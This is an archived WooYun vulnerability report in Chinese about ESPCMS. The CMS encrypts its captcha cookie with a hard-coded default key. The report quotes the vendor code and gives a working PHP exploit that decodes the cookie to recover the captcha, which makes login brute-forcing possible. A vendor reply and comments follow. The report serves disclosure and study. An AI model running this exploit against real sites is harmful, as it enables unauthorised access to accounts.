{"id": 49120, "wybug_id": "wooyun-2014-075238", "wybug_title": "ESPCMS 全版验证码破解验证码等于虚设（可导致爆破等附解密exp）", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "风情万种", "wybug_date": "2014-09-06 12:01", "wybug_open_date": "2014-12-05 12:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向公众公开  简要描述： ESPCMS 全版！验证码破解！验证码等于虚设（可导致爆破等） 详细说明：  先看验证码生成的方法！只是生成了一个6位随机数 然后加密保存到cookie中！关键点在于加密函数eccode 竟然采用的是默认的key\n$fun = new functioninc();$seccode = rand(100000, 999999);$secode = $fun->accept('secode', 'R');if ($secode == 'ecisp_seccode') {\t$secode_name = 'ecisp_seccode';} else {\t$secode_name = 'ecisp_home_seccode';}$fun->setcookie($secode_name, $fun->eccode($seccode . \"\\t\" . time(), 'ENCODE'));\n文件/public/class_function.php加密函数\nfunction eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%', $mcrype = true) {\t\t$result = null;\t\tif ($operation == 'ENCODE') {\t\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t\t$char = substr($string, $i, 1);\t\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t\t$char = chr(ord($char) + ord($keychar));\t\t\t\t$result.=$char;\t\t\t}\t\t\t$result = base64_encode($result);\t\t\t$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);\t\t} elseif ($operation == 'DECODE') {\t\t\t$data = str_replace(array('-', '_'), array('+', '/'), $string);\t\t\t$mod4 = strlen($data) % 4;\t\t\tif ($mod4) {\t\t\t\t$data .= substr('====', $mod4);\t\t\t}\t\t\t$string = base64_decode($data);\t\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t\t$char = substr($string, $i, 1);\t\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t\t$char = chr(ord($char) - ord($keychar));\t\t\t\t$result.=$char;\t\t\t}\t\t}\t\treturn $result;\t}\n再看验证码验证机制\nfunction onlogin_into() {\t\tinclude_once admin_ROOT . '/public/class_seccode.php';\t\t$linkURL = $_SERVER['HTTP_REFERER'];...................................\t\tlist($new_seccode, $expiration) = explode(\"\\t\", $this->fun->eccode($_COOKIE['ecisp_seccode'], 'DECODE'));\t\t$code = new seccode();\t\t$code->seccodeconvert($new_seccode);...................................}\n给你们看下他的seccodeconvert函数 就是将6位随机数变成验证码的\nfunction seccodeconvert(&$seccode) {\t\t$s = sprintf('%04s', base_convert($seccode, 10, 20));\t\t$seccodeunits = 'CEFHKLMNOPQRSTUVWXYZ';\t\t$seccode = '';\t\tfor ($i = 0; $i < 4; $i++) {\t\t\t$unit = ord($s{$i});\t\t\t$seccode.= ( $unit >= 0x30 && $unit <= 0x39) ? $seccodeunits[$unit - 0x30] : $seccodeunits[$unit - 0x57];\t\t}\t}\n那么写个exp破解下？根据验证验证码的代码逻辑得到一下exp\n<?phplist($new_seccode, $expiration) = explode(\"\\t\",eccode('XHZ-d4JlPaRmYm1edquRmYY', 'DECODE')); //XHZ-d4JlPaRmYm1edquRmYY 就是$_COOKIE['ecisp_seccode']就是名为ecisp_seccode的cookieecho seccodeconvert($new_seccode);function seccodeconvert(&$seccode) {\t$s = sprintf('%04s', base_convert($seccode, 10, 20));\t$seccodeunits = 'CEFHKLMNOPQRSTUVWXYZ';\t$seccode = '';\tfor ($i = 0; $i < 4; $i++) {\t\t$unit = ord($s{$i});\t\t$seccode.= ( $unit >= 0x30 && $unit <= 0x39) ? $seccodeunits[$unit - 0x30] : $seccodeunits[$unit - 0x57];\t}\treturn $seccode;}function eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%', $mcrype = true) {\t$result = null;\tif ($operation == 'ENCODE') {\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t$char = substr($string, $i, 1);\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t$char = chr(ord($char) + ord($keychar));\t\t\t$result.=$char;\t\t}\t\t$result = base64_encode($result);\t\t$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);\t} elseif ($operation == 'DECODE') {\t\t$data = str_replace(array('-', '_'), array('+', '/'), $string);\t\t$mod4 = strlen($data) % 4;\t\tif ($mod4) {\t\t\t$data .= substr('====', $mod4);\t\t}\t\t$string = base64_decode($data);\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t$char = substr($string, $i, 1);\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t$char = chr(ord($char) - ord($keychar));\t\t\t$result.=$char;\t\t}\t}\treturn $result;}?>\n\n\n   漏洞证明：  \n\n   修复方案：  .....   版权声明：转载请注明来源 风情万种@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-09-07 08:41 厂商回复： key为随机选项，大部分的用户在使用的时候，我们建议使用mcrype加密。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-10 15:00 |    \t\tlinadmin \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:30        | 低调进取，低调为人)\t\t \n  ESPCMS的加密策略为毛被忽略    \n     2014-12-09 23:19 |    \t\tagnes0621 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | a)\t\t \n  @linadmin espcms的加解密函数已经被日烂了，随机key都能破解出来，利用加解密函数的问题能写出一大堆注入神马的漏洞    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}